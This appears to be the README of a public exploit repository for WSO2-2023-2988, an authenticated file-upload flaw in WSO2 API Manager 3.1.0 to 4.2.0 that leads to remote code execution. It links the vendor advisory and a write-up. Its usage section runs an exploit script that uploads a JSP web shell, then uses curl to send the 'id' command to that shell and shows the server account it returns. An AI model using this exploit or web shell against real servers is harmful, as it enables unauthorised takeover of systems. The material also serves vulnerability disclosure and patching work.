# WSO2-2023-2988: WSO2 Arbitrary File Upload to RCE

## Information  

**Description**: A vulnerability in the 'Add API Documentation' feature allows malicious users with specific permissions (`/permission/admin/login` and `/permission/admin/manage/api/publish`) to upload arbitrary files to a user-controlled
server location. This flaw could be exploited to execute remote code, enabling an attacker to gain control over the server.   
**Versions Affected**: WSO2 API Manager 4.2.0, 4.1.0, 4.0.0, 3.2.0, 3.1.0  
**Researcher:** [Siebene@](https://github.com/siebene)   
**Write-up Link:** https://blog.redwaysecurity.com/2024/11/wso2-4.2.0-remote-code-execution.html  
**Advisory Link:** https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2023-2988/  


## Usage
```bash
$ python3 exploit.py -t https://localhost:9443 -u redway -p redway
INFO:root:Authenticating...
INFO:root:Authentication successful.
INFO:root:Retrieving list of available APIs...
INFO:root:Document 40d93d7dae64eda44 created successfully.
INFO:root:File uploaded successfully. Access it at: https://localhost:9443/authenticationendpoint/test_40d93d7dae64eda44.jsp
```

```bash
 curl -k   https://localhost:9443/authenticationendpoint/test_40d93d7dae64eda44.jsp?cmd=id

    <FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>


    <pre>uid=802(wso2carbon) gid=802(wso2) groups=802(wso2)<br></pre>
```